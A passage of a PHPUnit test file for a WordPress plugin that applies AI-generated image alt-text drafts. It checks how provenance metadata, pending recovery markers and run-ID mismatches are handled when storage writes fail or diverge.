        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['partial']);
        $this->assertSame([71], $data['failed']);
        $this->assertSame('GARBAGE', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * R21-BR-04: provenance write accepts but stores a divergent ARRAY → not
     * applied. Marker plant + partial (equality leg of provenance read-back).
     */
    public function testApplyRunDraftsBucketsPartialWhenProvenanceStoreDivergesToArray(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $GLOBALS['__ac_update_post_meta_mutate'][71]['_acx_description_provenance'] = [
            'adapter' => 'MUTATED',
            'run_id' => 'not-this-run',
        ];
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['partial']);
        $this->assertSame([], $data['failed']);
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame(hash('sha256', 'a dog in a park'), $pending['draft_hash'] ?? null);
    }

    /**
     * R21-BR-08: pre-existing same-draft marker with a different run_id is
     * usable when this plant fails — do not demand strict identity.
     * Stops at partial (plant-accept pin). For second-apply recovery see
     * testApplyRunDraftsSecondApplyRecoversForeignRunSameDraftMarker [R22-BR-02].
     */
    public function testApplyRunDraftsAcceptsPreExistingSameDraftMarkerWhenPlantFails(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $draft = 'a dog in a park';
        $this->plantPostType(71);
        $otherMarker = [
            'run_id' => 'single_image',
            'draft_hash' => \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt($draft),
        ];
        $this->setPostMeta(71, '_acx_description_provenance_pending', $otherMarker);
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance_pending'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([71], $data['partial']);
        $this->assertSame([], $data['failed']);
        $this->assertSame($otherMarker, get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * R22-BR-03 [TEST-15]: bulk apply alt write returns non-false but storage
     * diverges → failed (not applied). Pins unconditional alt read-back.
     * RED under: restore `if ( false === $alt_written ) { … }` gate.
     */
    public function testApplyRunDraftsAltDivergentNonFalseStoreReportsFailedNotApplied(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $GLOBALS['__ac_update_post_meta_mutate'][71]['_wp_attachment_image_alt'] = 'MUTATED BULK ALT';

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([71], $data['failed']);
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame('MUTATED BULK ALT', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
    }

    /**
     * R20-BR-20: pre-plant identical marker so update returns false; read-back admits partial.
     */
    public function testApplyRunDraftsMarkerNoOpFalseReturnAcceptedWhenReadBackMatches(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $draft = 'a dog in a park';
        $this->plantPostType(71);
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', $draft),
        ]);
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([71], $data['partial']);
        $this->assertSame([], $data['failed']);
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($runId, $pending['run_id']);
        $this->assertSame(hash('sha256', $draft), $pending['draft_hash']);
    }

    /**
     * BR-107: run_id for markers and the response comes from the path, not the
     * items body — omitting body run_id must not plant an empty-string marker.
     */
    public function testApplyRunDraftsUsesPathRunIdWhenItemsBodyOmitsRunId(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            // Body deliberately omits run_id.
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame($runId, $data['run_id']);
        $this->assertSame([71], $data['partial']);
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($runId, $pending['run_id']);
        $this->assertSame(hash('sha256', 'a dog in a park'), $pending['draft_hash']);
    }

    /**
     * BR-107: items body run_id that disagrees with the path is rejected 400.
     */
    public function testApplyRunDraftsRejectsWhenItemsBodyRunIdDisagreesWithPath(): void
    {
        $pathRunId = '11111111-1111-1111-1111-111111111111';
        $bodyRunId = '22222222-2222-2222-2222-222222222222';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($pathRunId, 'completed');
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $bodyRunId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $pathRunId . '/apply');
        $request->set_param('run_id', $pathRunId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_id_mismatch', $response->get_error_code());
        $this->assertSame(400, $response->get_error_data()['status'] ?? null);
        // Nothing written.
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
    }

    /**
     * BR-126 / R23-BR-02: matching marker + alt===draft + pre-existing provenance
     * from a *different* run that names a **different** draft must complete
     * (replace stale envelope) and clear the marker. Completeness leg rejects
     * only provenance that already describes the stored alt.
     */
    public function testApplyRunDraftsRecoversPartialWhenOlderProvenanceExists(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $draft = 'a cat on a sofa';
        $oldProv = [
            'adapter' => 'florence',
            'model_id' => 'old-model',
            'source' => 'cli_describe',
            'run_id' => '00000000-0000-0000-0000-000000000099',
            'applied_at' => '2025-01-01T00:00:00+00:00',
            'alt_text_draft' => 'An older generated draft.',
        ];
        // After a prior partial: alt is the new draft, marker planted, old prov remains.
        $this->setPostMeta(70, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(70, '_acx_description_provenance', $oldProv);
        $this->setPostMeta(70, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', $draft),
        ]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [70]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'cat', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        // No overwrite — recovery must complete despite older provenance.

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([70], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['skipped_existing']);
        $this->assertSame($draft, get_post_meta(70, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(70, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame($runId, $prov['run_id']);
        $this->assertSame($draft, $prov['alt_text_draft']);
        $this->assertSame('bulk_describe_run', $prov['source']);
        $this->assertSame('', get_post_meta(70, '_acx_description_provenance_pending', true));
    }

    /**
     * R23-BR-02 [TEST-15]: complete foreign provenance for THIS draft + surviving
     * same-draft foreign marker + second apply without overwrite → skipped_existing,
     * provenance run_id unchanged (no silent re-attribution).
     *
     * RED against the pre-fix tree (marker + alt match + !prov_is_this_run
     * unlocked recovery and re-stamped run_id/applied_at).
     */
    public function testApplyRunDraftsSkipsWhenForeignProvenanceAlreadyDescribesStoredAlt(): void
    {
        $foreignRunId = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
        $thisRunId    = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';
        $draft        = 'a dog in a park';
        $this->plantPostType(71);
        $existingProv = [
            'adapter' => 'florence',
            'model_id' => 'florence-2',
            'source' => 'bulk_describe_run',
            'run_id' => $foreignRunId,
            'applied_at' => '2026-01-15T12:00:00+00:00',
            'alt_text_draft' => $draft,
        ];
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(71, '_acx_description_provenance', $existingProv);
        // Surviving foreign same-draft marker (R21-BR-10 soft miss shape).
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => $foreignRunId,
            'draft_hash' => \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt($draft),
        ]);
        $this->queueRunStatusResponse($thisRunId, 'completed');
        $this->plantSubmittedMediaIds($thisRunId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $thisRunId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $thisRunId . '/apply');
        $request->set_param('run_id', $thisRunId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame($draft, get_post_meta(71, '_wp_attachment_image_alt', true));
        // Provenance run_id and full envelope unchanged — no re-stamp.
        $this->assertSame($existingProv, get_post_meta(71, '_acx_description_provenance', true));
        $this->assertSame($foreignRunId, get_post_meta(71, '_acx_description_provenance', true)['run_id']);
        // Foreign marker left for its owner (BR-114 only drops own-run markers).
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($foreignRunId, $pending['run_id'] ?? null);
    }

    /**
     * R23-BR-05 [TEST-15]: own-run marker whose draft_hash no longer matches the
     * currently stored alt is collected on skip_existing when alt happens to
     * equal the new draft. RED under: drop only on alt_diverged || prov_is_this_run.
     */
    public function testApplyRunDraftsDropsStaleOwnRunMarkerWhenAltMatchesNewDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $currentDraft = 'a dog in a park';
        $this->plantPostType(71);
        $this->setPostMeta(71, '_wp_attachment_image_alt', $currentDraft);
        // Own-run marker for a superseded draft (not live for stored alt).
        $staleMarker = [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', 'superseded draft text'),
        ];
        $this->setPostMeta(71, '_acx_description_provenance_pending', $staleMarker);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $currentDraft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame($currentDraft, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        // Stale own-run marker collected.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * R23-BR-05 discrimination guard: true partial — own-run marker live for
     * stored alt D, alt IS D, provenance empty — must NOT wipe the marker on a
     * path that would skip (e.g. foreign complete envelope is absent so recovery
     * proceeds). Pin: first apply plants marker; marker present before second
     * apply recovers. Dropping live markers would break recovery.
     *
     * Exercises: after partial, marker survives in storage until recovery write.
     */
    public function testApplyRunDraftsTruePartialOwnRunMarkerSurvivesUntilRecovery(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $draft = 'a dog in a park';
        $this->plantPostType(71);
        // Simulate true partial state without re-running the fail path:
        // alt landed, marker live for stored form, provenance empty.
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $liveMarker = [
            'run_id' => $runId,
            'draft_hash' => \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt($draft),
        ];
        $this->setPostMeta(71, '_acx_description_provenance_pending', $liveMarker);
        // No provenance — true gap.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        $this->assertTrue(
            \AltContext\Api\Services\DescriptionHistoryService::is_live_recovery_marker_for_alt(
                $liveMarker,
                $draft
            )
        );

        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        // Recovery unlocked — not skipped (which would mean live marker was treated as dead).
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['skipped_existing']);
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame($runId, $prov['run_id'] ?? null);
        // R23-BR-08 / R23-BR-22: same-run recovery is explicit kind, not absence.
        $this->assertArrayNotHasKey('recovered_from_run_id', $prov);
        $this->assertIsArray($prov['recovered_from'] ?? null);
        $this->assertSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_SAME_RUN,
            $prov['recovered_from']['kind'] ?? null
        );
        $this->assertArrayHasKey('origin', $prov['recovered_from']);
        $this->assertNull($prov['recovered_from']['origin']);
        // Marker cleared only after successful recovery, not by BR-114 stale drop.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * R23-BR-18 [TEST-15]: live own-run marker (true partial for stored alt S)
     * must survive skip_existing when this run applies a *different* draft D.
     * The alt_diverged arm previously deleted the marker while the owning run's
     * recovery evidence was still live for S — completion could no longer match
     * the attachment.
     *
     * Concrete input that reaches the arm:
     *   stored alt = S, own-run marker draft_hash = sha256(S) (live),
     *   applying draft D ≠ S, no overwrite, no provenance → recovery rejected
     *   with alt_diverged=true and own_marker_stale=false.
     *
     * RED under: drop when `$alt_diverged || $prov_is_this_run || $stale`
     * (alt_diverged alone wipes the live marker).
     */
    public function testApplyRunDraftsPreservesLiveOwnRunMarkerWhenAltDivergesFromNewDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $storedAlt = 'partial alt still owned by run';
        $newDraft  = 'a different draft from a later apply';
        $this->plantPostType(71);
        $this->setPostMeta(71, '_wp_attachment_image_alt', $storedAlt);
        $liveMarker = [
            'run_id'     => $runId,
            'draft_hash' => \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt($storedAlt),
        ];
        $this->setPostMeta(71, '_acx_description_provenance_pending', $liveMarker);
        $this->assertTrue(
            \AltContext\Api\Services\DescriptionHistoryService::is_live_recovery_marker_for_alt(
                $liveMarker,
                $storedAlt
            ),
            'precondition: marker must be live recovery evidence for stored alt'
        );
        $this->assertNotSame($storedAlt, $newDraft, 'precondition: drafts must diverge');

        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $newDraft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame($storedAlt, get_post_meta(71, '_wp_attachment_image_alt', true));
        // R23-BR-18: marker still names the owning run — not dropped on alt_diverged.
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending, 'live own-run marker must survive alt_diverged skip');
        $this->assertSame($runId, $pending['run_id'] ?? null);
        $this->assertSame($liveMarker['draft_hash'], $pending['draft_hash'] ?? null);
    }

    /**
     * R23-BR-19 [TEST-15]: staleness is per-run. Two markers across the identity
     * boundary — foreign run A's marker is content-stale for the stored alt,
     * applying run B must NOT collect it (identity leg false). Own-run B with
     * the same content-stale hash IS collected.
     *
     * Failure input under a content-only predicate: foreign stale marker judged
     * by draft_hash alone and wiped, so run A's ownership is lost.
     *
     * RED under: identity leg removed from is_stale_own_run_marker_for_alt
     * (content leg alone → foreign stale marker deleted on B's apply). The
     * failing assertion is the apply-path survival check — not a helper
     * precondition — so the RED line proves the identity leg at the call site.
     * Mutating only the content/hash leg fails a different assertion (own-run
     * collect) and does not prove identity.
     */
    public function testApplyRunDraftsStalePredicateIsIdentityScopedAcrossTwoRuns(): void
    {
        $runA = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
        $runB = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';
        $storedAlt = 'current stored alt text';
        $draftB    = 'run B draft that diverges';
        $this->plantPostType(71);
        $this->setPostMeta(71, '_wp_attachment_image_alt', $storedAlt);

        // Run A owns a content-stale marker (hash does not match stored alt).
        $staleHash = \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt('superseded by operator edit');
        $foreignStaleMarker = [
            'run_id'     => $runA,
            'draft_hash' => $staleHash,
        ];
        $this->setPostMeta(71, '_acx_description_provenance_pending', $foreignStaleMarker);

        // Apply run B — must leave run A's marker in place (identity leg).
        $this->queueRunStatusResponse($runB, 'completed');
        $this->plantSubmittedMediaIds($runB, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runB,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draftB, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $requestB = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runB . '/apply');
        $requestB->set_param('run_id', $runB);
        $responseB = $this->controller->apply_describe_run_drafts($requestB);
        $this->assertNotInstanceOf(\WP_Error::class, $responseB);
        $this->assertSame([71], $responseB->get_data()['skipped_existing']);
        // Identity-leg pin assertion: foreign stale marker survives B's apply.
        $pendingAfterB = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pendingAfterB, 'foreign stale marker must survive run B apply');
        $this->assertSame($runA, $pendingAfterB['run_id'] ?? null, 'marker must still name run A');

        // Own-run apply with the same content-stale marker shape → collected.
        $ownStaleMarker = [
            'run_id'     => $runB,
            'draft_hash' => $staleHash,
        ];
        $this->setPostMeta(71, '_acx_description_provenance_pending', $ownStaleMarker);
        $this->queueRunStatusResponse($runB, 'completed');
        $this->plantSubmittedMediaIds($runB, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runB,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draftB, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $requestB2 = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runB . '/apply');
        $requestB2->set_param('run_id', $runB);
        $responseB2 = $this->controller->apply_describe_run_drafts($requestB2);
        $this->assertNotInstanceOf(\WP_Error::class, $responseB2);
        // Content-leg discrimination: own-run stale still clears (not a permanent lock).
        $this->assertSame(
            '',
            get_post_meta(71, '_acx_description_provenance_pending', true),
            'own-run content-stale marker must be collected'
        );
    }

    /**
     * R23-BR-24 [TEST-15]: takeover attribution — one canonical definition
     * (DescriptionHistoryService::resolve_recovery_descriptor) used by apply
     * when stamping. Drive foreign-marker recovery (run A marker, run B apply);
     * assert both observables agree on recovered_from = A:
     *   (1) stamped `_acx_description_provenance` after apply
     *   (2) history list_history provenance for the same media
     * Hard-expected owner is run A (not a second call into resolve — that would
     * be tautological). RED when resolve always returns null (apply omits the
     * key) or when apply bypasses the resolver and stamps a divergent owner.
     */
    public function testApplyRunDraftsTakeoverAttributionMatchesHistoryResolver(): void
    {
        $runA  = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
        $runB  = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';
        $draft = 'a dog in a park';
        $this->plantPostType(71);
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $foreignMarker = [
            'run_id'     => $runA,
            'draft_hash' => \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt($draft),
        ];
        $this->setPostMeta(71, '_acx_description_provenance_pending', $foreignMarker);

        $this->queueRunStatusResponse($runB, 'completed');
        $this->plantSubmittedMediaIds($runB, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runB,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runB . '/apply');
        $request->set_param('run_id', $runB);
        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame([71], $response->get_data()['applied']);

        // Call site 1 observable: stamped provenance after apply (uses resolver).
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame($runB, $prov['run_id'] ?? null);
        $this->assertArrayNotHasKey('recovered_from_run_id', $prov);
        $this->assertSame(
            $runA,
            $prov['recovered_from']['origin'] ?? null,
            'apply stamp must attribute takeover origin to marker owner run A'
        );
        $this->assertSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_RUN,
            $prov['recovered_from']['kind'] ?? null
        );

        // Call site 2 observable: history list surfaces the same provenance map.
        $GLOBALS['__ac_get_posts_results'] = [71];
        $GLOBALS['__ac_posts'][71] = (object) ['ID' => 71, 'post_title' => 'Dog', 'post_type' => 'attachment'];
        $history = (new \AltContext\Api\Services\DescriptionHistoryService())->list_history(10);
        $this->assertSame(1, $history['total']);
        $this->assertSame(
            $runA,
            $history['items'][0]['provenance']['recovered_from']['origin'] ?? null,
            'history list must surface the same recovered_from as the apply stamp'
        );
        // Both surfaces agree with each other (disagreement is the defect).
        $this->assertSame(
            $prov['recovered_from'] ?? null,
            $history['items'][0]['provenance']['recovered_from'] ?? null
        );
    }

    /**
     * R23-BR-24 [TEST-15] history-reader pin (standalone): takeover then assert
     * only on list_history output. No apply-stamp recovered_from assertion
     * ahead of the history read — so a resolver mutation that omits the key
     * reddens *this* reader-visible line, not an earlier stamp check.
     *
     * Proves the history surface has no second divergent inline rule that
     * would still invent recovered_from=A when the canonical resolver is
     * forced to return null. Observable is what a reader sees via
     * list_history, not a second call into resolve_* itself.
     */
    public function testApplyRunDraftsTakeoverHistoryListSurfacesResolvedOrigin(): void
    {
        $runA  = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
        $runB  = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';
        $draft = 'a dog in a park';
        $this->plantPostType(71);
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id'     => $runA,
            'draft_hash' => \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt($draft),
        ]);

        $this->queueRunStatusResponse($runB, 'completed');
        $this->plantSubmittedMediaIds($runB, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runB,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
